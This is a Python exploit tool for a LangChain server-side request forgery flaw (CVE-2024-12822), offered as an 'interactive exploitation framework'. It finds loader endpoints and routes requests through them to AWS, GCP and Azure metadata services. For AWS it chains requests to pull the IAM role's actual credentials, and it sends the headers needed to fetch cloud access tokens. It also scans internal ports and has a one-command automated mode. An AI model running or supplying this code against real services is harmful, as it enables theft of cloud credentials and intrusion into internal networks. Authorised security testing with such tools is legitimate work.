#!/usr/bin/env python3
"""
Interactive Exploit PoC for CVE-2024-12822 (LangChain SSRF)

This tool provides an interactive exploitation framework for testing
LangChain SSRF vulnerabilities with multiple attack vectors.

Author: Tsunami Community
License: Apache 2.0
"""

import argparse
import json
import sys
import time
from typing import Dict, List, Optional
from urllib.parse import urljoin, urlparse
import requests
from colorama import Fore, Style, init

# Initialize colorama for cross-platform colored output
init(autoreset=True)


class LangChainSSRFExploit:
    """Interactive exploit framework for CVE-2024-12822."""

    # Common LangChain API endpoints
    COMMON_ENDPOINTS = [
        "/api/load",
        "/api/loader", 
        "/api/document/load",
        "/api/retrieve",
        "/load_document",
        "/fetch_url",
        "/api/v1/load",
        "/api/v1/document",
    ]

    # Cloud metadata endpoints
    CLOUD_METADATA = {
        "AWS": {
            "credentials": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "instance": "http://169.254.169.254/latest/meta-data/instance-id",
            "user_data": "http://169.254.169.254/latest/user-data",
            "region": "http://169.254.169.254/latest/meta-data/placement/region",
        },
        "GCP": {
            "token": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "project": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "attributes": "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
        },
        "Azure": {
            "metadata": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "identity": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        },
        "DigitalOcean": {
            "metadata": "http://169.254.169.254/metadata/v1.json",
        },
    }

    # Internal service discovery ports
    COMMON_PORTS = [
        22, 80, 443, 3306, 5432, 6379, 8080, 8888, 9000, 27017,
        5000, 8000, 3000, 9090, 11211, 50070, 8081
    ]

    def __init__(self, target_url: str, timeout: int = 10, proxy: Optional[str] = None):
        """Initialize the exploit framework."""
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.vulnerable_endpoints = []

    def print_banner(self):
        """Print the tool banner."""
        banner = f"""
{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   LangChain SSRF Exploit PoC (CVE-2024-12822)                ║
║   Interactive Exploitation Framework                          ║
║                                                               ║
║   Target: {self.target_url[:43]:<43} ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)

    def print_success(self, message: str):
        """Print success message."""
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {message}")

    def print_error(self, message: str):
        """Print error message."""
        print(f"{Fore.RED}[-]{Style.RESET_ALL} {message}")

    def print_info(self, message: str):
        """Print info message."""
        print(f"{Fore.BLUE}[*]{Style.RESET_ALL} {message}")

    def print_warning(self, message: str):
        """Print warning message."""
        print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {message}")

    def discover_endpoints(self) -> List[str]:
        """Discover vulnerable LangChain endpoints."""
        self.print_info("Scanning for LangChain endpoints...")
        
        for endpoint in self.COMMON_ENDPOINTS:
            url = urljoin(self.target_url, endpoint)
            try:
                response = self.session.post(
                    url,
                    json={"url": "http://example.com"},
                    timeout=self.timeout
                )
                
                # Check for indicators of LangChain
                if response.status_code in [200, 400, 422, 500]:
                    # Look for LangChain-specific error messages or responses
                    content = response.text.lower()
                    if any(keyword in content for keyword in [
                        "langchain", "document", "loader", "url", "fetch"
                    ]):
                        self.vulnerable_endpoints.append(endpoint)
                        self.print_success(f"Found potential endpoint: {endpoint}")
            except Exception as e:
                pass
        
        if not self.vulnerable_endpoints:
            self.print_warning("No obvious endpoints found. Try manual endpoint specification.")
        
        return self.vulnerable_endpoints

    def test_ssrf_basic(self, endpoint: str, callback_url: str) -> bool:
        """Test basic SSRF with callback URL."""
        self.print_info(f"Testing SSRF on {endpoint}...")
        
        url = urljoin(self.target_url, endpoint)
        
        payloads = [
            {"url": callback_url},
            {"source": callback_url},
            {"document_url": callback_url},
            {"web_url": callback_url},
            {"file_url": callback_url},
            {"path": callback_url},
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(
                    url,
                    json=payload,
                    timeout=self.timeout
                )
                
                # Check for SSRF indicators
                if response.status_code in [200, 500]:
                    self.print_success(f"Potential SSRF with payload: {payload}")
                    return True
            except Exception:
                pass
        
        return False

    def exploit_aws_metadata(self, endpoint: str) -> Dict:
        """Exploit SSRF to retrieve AWS metadata."""
        self.print_info("Attempting AWS metadata extraction...")
        
        url = urljoin(self.target_url, endpoint)
        results = {}
        
        for key, metadata_url in self.CLOUD_METADATA["AWS"].items():
            try:
                self.print_info(f"Fetching {key}...")
                
                response = self.session.post(
                    url,
                    json={"url": metadata_url},
                    timeout=self.timeout * 2
                )
                
                if response.status_code == 200:
                    # Try to extract data from response
                    results[key] = response.text[:500]  # Limit output
                    self.print_success(f"Retrieved {key}")
                    
                    # If we got credentials, try to get the actual keys
                    if key == "credentials" and response.text:
                        role_name = response.text.strip().split('\n')[0]
                        cred_url = f"{metadata_url}{role_name}"
                        
                        cred_response = self.session.post(
                            url,
                            json={"url": cred_url},
                            timeout=self.timeout * 2
                        )
                        
                        if cred_response.status_code == 200:
                            results["actual_credentials"] = cred_response.text
                            self.print_success("Retrieved actual AWS credentials!")
                            
            except Exception as e:
                self.print_error(f"Failed to retrieve {key}: {str(e)}")
        
        return results

    def exploit_gcp_metadata(self, endpoint: str) -> Dict:
        """Exploit SSRF to retrieve GCP metadata."""
        self.print_info("Attempting GCP metadata extraction...")
        
        url = urljoin(self.target_url, endpoint)
        results = {}
        
        for key, metadata_url in self.CLOUD_METADATA["GCP"].items():
            try:
                self.print_info(f"Fetching {key}...")
                
                # GCP requires Metadata-Flavor header
                headers = {"Metadata-Flavor": "Google"}
                
                response = self.session.post(
                    url,
                    json={
                        "url": metadata_url,
                        "headers": headers
                    },
                    timeout=self.timeout * 2
                )
                
                if response.status_code == 200:
                    results[key] = response.text[:500]
                    self.print_success(f"Retrieved {key}")
            except Exception as e:
                self.print_error(f"Failed to retrieve {key}: {str(e)}")
        
        return results

    def port_scan_internal(self, endpoint: str, target_ip: str = "127.0.0.1") -> List[int]:
        """Scan internal ports via SSRF."""
        self.print_info(f"Scanning internal ports on {target_ip}...")
        
        url = urljoin(self.target_url, endpoint)
        open_ports = []
        
        for port in self.COMMON_PORTS:
            try:
                scan_url = f"http://{target_ip}:{port}/"
                
                start_time = time.time()
                response = self.session.post(
                    url,
                    json={"url": scan_url},
                    timeout=5
                )
                elapsed_time = time.time() - start_time
                
                # Open ports typically respond faster or with different status
                if response.status_code == 200 or elapsed_time < 1:
                    open_ports.append(port)
                    self.print_success(f"Port {port} appears OPEN")
                    
            except requests.exceptions.Timeout:
                # Timeout might indicate port is filtered
                pass
            except Exception:
                pass
        
        return open_ports

    def interactive_mode(self):
        """Run interactive exploitation mode."""
        self.print_banner()
        
        while True:
            print(f"\n{Fore.CYAN}Available Actions:{Style.RESET_ALL}")
            print("1. Discover endpoints")
            print("2. Test basic SSRF (requires callback URL)")
            print("3. Exploit AWS metadata")
            print("4. Exploit GCP metadata")
            print("5. Exploit Azure metadata")
            print("6. Internal port scan")
            print("7. Custom SSRF payload")
            print("8. Full automated exploitation")
            print("9. Exit")
            
            choice = input(f"\n{Fore.YELLOW}Select action [1-9]: {Style.RESET_ALL}").strip()
            
            if choice == "1":
                self.discover_endpoints()
                
            elif choice == "2":
                callback_url = input("Enter callback URL (e.g., http://your-server.com/callback): ").strip()
                if not self.vulnerable_endpoints:
                    endpoint = input("Enter endpoint (e.g., /api/load): ").strip()
                else:
                    endpoint = self.vulnerable_endpoints[0]
                self.test_ssrf_basic(endpoint, callback_url)
                
            elif choice == "3":
                if not self.vulnerable_endpoints:
                    endpoint = input("Enter endpoint (e.g., /api/load): ").strip()
                else:
                    endpoint = self.vulnerable_endpoints[0]
                results = self.exploit_aws_metadata(endpoint)
                self.print_results(results, "AWS Metadata")
                
            elif choice == "4":
                if not self.vulnerable_endpoints:
                    endpoint = input("Enter endpoint (e.g., /api/load): ").strip()
                else:
                    endpoint = self.vulnerable_endpoints[0]
                results = self.exploit_gcp_metadata(endpoint)
                self.print_results(results, "GCP Metadata")
                
            elif choice == "5":
                if not self.vulnerable_endpoints:
                    endpoint = input("Enter endpoint (e.g., /api/load): ").strip()
                else:
                    endpoint = self.vulnerable_endpoints[0]
                self.exploit_azure_metadata(endpoint)
                
            elif choice == "6":
                if not self.vulnerable_endpoints:
                    endpoint = input("Enter endpoint (e.g., /api/load): ").strip()
                else:
                    endpoint = self.vulnerable_endpoints[0]
                target_ip = input("Enter target IP [127.0.0.1]: ").strip() or "127.0.0.1"
                open_ports = self.port_scan_internal(endpoint, target_ip)
                print(f"\n{Fore.GREEN}Open ports found: {open_ports}{Style.RESET_ALL}")
                
            elif choice == "7":
                self.custom_payload()
                
            elif choice == "8":
                self.full_exploitation()
                
            elif choice == "9":
                self.print_info("Exiting...")
                break
                
            else:
                self.print_error("Invalid choice!")

    def exploit_azure_metadata(self, endpoint: str) -> Dict:
        """Exploit SSRF to retrieve Azure metadata."""
        self.print_info("Attempting Azure metadata extraction...")
        
        url = urljoin(self.target_url, endpoint)
        results = {}
        
        for key, metadata_url in self.CLOUD_METADATA["Azure"].items():
            try:
                self.print_info(f"Fetching {key}...")
                
                response = self.session.post(
                    url,
                    json={
                        "url": metadata_url,
                        "headers": {"Metadata": "true"}
                    },
                    timeout=self.timeout * 2
                )
                
                if response.status_code == 200:
                    results[key] = response.text[:500]
                    self.print_success(f"Retrieved {key}")
            except Exception as e:
                self.print_error(f"Failed to retrieve {key}: {str(e)}")
        
        return results

    def custom_payload(self):
        """Execute custom SSRF payload."""
        if not self.vulnerable_endpoints:
            endpoint = input("Enter endpoint (e.g., /api/load): ").strip()
        else:
            endpoint = self.vulnerable_endpoints[0]
            
        target_url = input("Enter target URL for SSRF: ").strip()
        
        url = urljoin(self.target_url, endpoint)
        
        try:
            response = self.session.post(
                url,
                json={"url": target_url},
                timeout=self.timeout
            )
            
            self.print_success(f"Response status: {response.status_code}")
            print(f"\n{Fore.CYAN}Response body:{Style.RESET_ALL}")
            print(response.text[:1000])
        except Exception as e:
            self.print_error(f"Request failed: {str(e)}")

    def full_exploitation(self):
        """Run full automated exploitation."""
        self.print_info("Running full automated exploitation...")
        
        # Step 1: Discover endpoints
        self.discover_endpoints()
        
        if not self.vulnerable_endpoints:
            self.print_error("No endpoints found. Cannot continue.")
            return
        
        endpoint = self.vulnerable_endpoints[0]
        
        # Step 2: Try cloud metadata extraction
        self.print_info("\n=== AWS Metadata Extraction ===")
        aws_results = self.exploit_aws_metadata(endpoint)
        
        self.print_info("\n=== GCP Metadata Extraction ===")
        gcp_results = self.exploit_gcp_metadata(endpoint)
        
        self.print_info("\n=== Azure Metadata Extraction ===")
        azure_results = self.exploit_azure_metadata(endpoint)
        
        # Step 3: Internal port scan
        self.print_info("\n=== Internal Port Scan ===")
        open_ports = self.port_scan_internal(endpoint)
        
        # Print summary
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}EXPLOITATION SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        self.print_results(aws_results, "AWS Metadata")
        self.print_results(gcp_results, "GCP Metadata")
        self.print_results(azure_results, "Azure Metadata")
        
        print(f"\n{Fore.GREEN}Open Internal Ports: {open_ports}{Style.RESET_ALL}")

    def print_results(self, results: Dict, title: str):
        """Print exploitation results."""
        if results:
            print(f"\n{Fore.GREEN}=== {title} ==={Style.RESET_ALL}")
            for key, value in results.items():
                print(f"{Fore.YELLOW}{key}:{Style.RESET_ALL} {value[:200]}")
        else:
            print(f"\n{Fore.RED}No {title} extracted{Style.RESET_ALL}")


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Interactive Exploit PoC for CVE-2024-12822 (LangChain SSRF)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -u http://target.com
  %(prog)s -u http://target.com -e /api/load
  %(prog)s -u http://target.com --auto
  %(prog)s -u http://target.com --aws-metadata
  %(prog)s -u http://target.com --port-scan 192.168.1.1
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-e', '--endpoint', help='Specific endpoint to test')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout (default: 10)')
    parser.add_argument('-p', '--proxy', help='HTTP proxy (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--auto', action='store_true', help='Run full automated exploitation')
    parser.add_argument('--aws-metadata', action='store_true', help='Extract AWS metadata')
    parser.add_argument('--gcp-metadata', action='store_true', help='Extract GCP metadata')
    parser.add_argument('--port-scan', metavar='IP', help='Scan internal ports on IP')
    parser.add_argument('--callback', help='Callback URL for SSRF testing')
    
    args = parser.parse_args()
    
    exploit = LangChainSSRFExploit(args.url, args.timeout, args.proxy)
    
    if args.auto:
        exploit.print_banner()
        exploit.full_exploitation()
    elif args.aws_metadata:
        exploit.print_banner()
        endpoint = args.endpoint or exploit.discover_endpoints()[0]
        results = exploit.exploit_aws_metadata(endpoint)
        exploit.print_results(results, "AWS Metadata")
    elif args.gcp_metadata:
        exploit.print_banner()
        endpoint = args.endpoint or exploit.discover_endpoints()[0]
        results = exploit.exploit_gcp_metadata(endpoint)
        exploit.print_results(results, "GCP Metadata")
    elif args.port_scan:
        exploit.print_banner()
        endpoint = args.endpoint or exploit.discover_endpoints()[0]
        ports = exploit.port_scan_internal(endpoint, args.port_scan)
        print(f"\n{Fore.GREEN}Open ports: {ports}{Style.RESET_ALL}")
    elif args.callback:
        exploit.print_banner()
        endpoint = args.endpoint or exploit.discover_endpoints()[0]
        exploit.test_ssrf_basic(endpoint, args.callback)
    else:
        # Interactive mode
        exploit.interactive_mode()


if __name__ == "__main__":
    main()
